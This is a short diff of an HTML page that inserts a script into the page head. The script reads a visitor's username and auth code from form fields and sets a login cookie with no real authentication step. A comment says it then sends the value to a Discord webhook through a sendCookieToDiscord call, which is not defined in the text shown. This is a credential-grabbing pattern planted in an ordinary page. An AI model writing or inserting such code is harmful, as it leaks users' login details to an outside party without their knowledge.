@@ -1,6 +1,19 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+    <script>
+        function authenticateAndSetCookie() {
+    var username = document.getElementById("username").value;
+    var authCode = document.getElementById("authCode").value;
+
+    // Perform authentication logic here
+    // If authentication is successful, set the cookie
+    setCookie("authenticatedUser", username, 1); // Set cookie for 1 day
+
+    // Send the cookie value to Discord webhook
+    sendCookieToDiscord(username);
+}
+    </script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta property="og:image:title" content="">
